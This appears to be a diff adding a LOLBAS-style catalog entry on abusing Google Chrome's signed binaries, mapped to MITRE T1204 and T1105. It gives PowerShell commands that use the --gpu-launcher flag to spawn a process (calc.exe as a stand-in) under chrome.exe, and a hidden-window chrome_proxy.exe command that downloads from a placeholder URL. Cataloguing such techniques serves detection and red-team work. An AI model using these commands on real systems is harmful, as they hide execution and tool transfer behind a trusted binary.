@@ -1,0 +1,36 @@
+---
+Name: Google Chrome
+Description: Google Chrome is a cross-platform web browser developed by Google.
+Author: 'Mirage'
+Created: 2023-07-17
+
+Category: Execution
+Privileges: User
+MitreID: T1204
+Usage:
+Steps: Execute following command in PowerShell.
+
+& 'C:\Program Files\Google\Chrome\Application\chrome.exe' --silent-launch --disable-gpu-sandbox --gpu-launcher="calc.exe"
+
+& 'C:\Program Files\Google\Chrome\Application\chrome_proxy.exe' --silent-launch --disable-gpu-sandbox --gpu-launcher="calc.exe"
+
+Use case:  Chrome spawns calc.exe as a child process of chrome.exe/chrome_proxy.exe and executes the ping command or execute a binary. Executes a process under a non suspicious signed binary.
+Resources:
+https://github.com/Miragle-Hub/Adversary-tactics-and-techniques-for-Windows/blob/main/Execution/Execution%20of%20binary%20using%20chrome
+
+Category: Download File from internet
+Privileges: User
+MitreID: T1105 Ingress Tool Transfer
+Usage:
+Steps: Execute following command in PowerShell. 
+
+ & 'C:\Program Files\Google\Chrome\Application\chrome_proxy.exe' --profile-directory=Default --incognito --chrome-frame --user-data-dir="C:\Temp\Temp-chrome\" --window-size=0,0 --window-position="0000,1000" <URL>
+ 
+Use case:  The script opens Google Chrome in a minimized window and allows it to download files from the internet without requiring much user intervention. Ensure the creation of a specific directory mentioned in "--user-data-dir" to establish a new profile data. 
+Resources:
+https://medium.com/@mirag3/exploring-alternative-methods-chrome-based-binary-execution-and-file-download-40e9a46ebc59
+https://github.com/Miragle-Hub/Adversary-tactics-and-techniques-for-Windows/blob/main/Lateral%20Movement%20/DownloadFileChrome_proxy.exe
+
+Acknowledgement:
+  - Person: @miragle-hub 
+  
